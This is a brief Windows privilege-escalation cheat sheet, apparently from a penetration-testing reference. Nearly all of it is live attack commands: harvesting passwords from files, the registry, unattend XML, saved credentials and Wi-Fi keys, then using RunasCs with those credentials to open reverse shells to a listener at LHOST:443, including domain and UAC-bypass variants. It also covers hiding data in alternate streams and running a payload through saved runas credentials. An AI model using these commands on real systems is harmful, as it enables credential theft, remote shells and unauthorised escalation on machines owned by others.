# Windows credential checks

[← Windows quick reference](../04-windows-privesc.md)

## Credential hunting
```powershell
# Files
findstr /si password *.txt *.ini *.config *.xml
type C:\Windows\Panther\Unattend.xml ; type C:\Windows\system32\sysprep\*.xml
# Registry
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword  # autologon creds
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"     # saved proxy/host
# Stored / Wi-Fi / browser
cmdkey /list ; netsh wlan show profile name=X key=clear
```

For SAM, LSA, LSASS, and cached material, follow [Windows credential access](credential-access.md).

## Run as another user with creds (RunasCs: no interactive desktop needed)
From a reverse shell, use RunasCs (plain `runas` needs an interactive desktop):
```powershell
.\RunasCs.exe <user> <pass> "cmd /c whoami"
.\RunasCs.exe <user> <pass> cmd.exe -r LHOST:443              # reverse shell AS <user>
.\RunasCs.exe <user> <pass> cmd.exe -d corp.example -r LHOST:443   # domain account
.\RunasCs.exe <user> <pass> cmd.exe --bypass-uac -r LHOST:443    # if <user> is a local admin
# PowerShell-only host (nothing on disk):
Invoke-RunasCs <user> <pass> "cmd /c whoami" -Domain corp.example
```
Alternate data streams: `dir /R`, `more < file:stream`, `type ... > file:hidden`.
- **Runas with saved creds:** `runas /savecred /user:admin C:\rev.exe`.
- UAC bypass only if you're admin-but-not-elevated (fodhelper, etc.).
